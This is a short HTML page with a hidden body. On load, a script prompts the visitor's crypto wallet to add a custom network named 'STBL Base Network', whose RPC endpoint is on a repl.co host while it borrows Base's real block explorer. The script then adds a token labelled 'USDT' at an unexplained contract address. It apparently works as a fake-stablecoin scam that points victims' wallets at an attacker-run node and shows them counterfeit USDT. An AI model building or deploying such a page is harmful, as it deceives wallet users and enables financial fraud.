<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>body { display: none; }</style>
</head>
<body>
  <script>
  (async () => {
    alert("Script started"); // Debug 1
    if (!window.ethereum) {
      alert("No wallet detected - please use a wallet app"); // Debug 2
      window.location.href = "about:blank"; // Exit cleanly
      return;
    }
    alert("Wallet detected"); // Debug 3
    try {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x14A77", // Unique ID (84531 decimal)
          chainName: "STBL Base Network",
          rpcUrls: ["https://stbl-api-aod.alijohnod.repl.co/rpc"],
          nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
          blockExplorerUrls: ["https://basescan.org"]
        }]
      });
      alert("Network added"); // Debug 4
      await window.ethereum.request({
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c",
            symbol: "USDT",
            decimals: 18,
            chainId: "84531" // Decimal
          }
        }
      });
      alert("Token added"); // Debug 5
      window.location.href = "about:blank";
    } catch (e) {
      alert("Error: " + e.message); // Debug 6
      window.location.href = "about:blank";
    }
  })();
  </script>
</body>
</html>
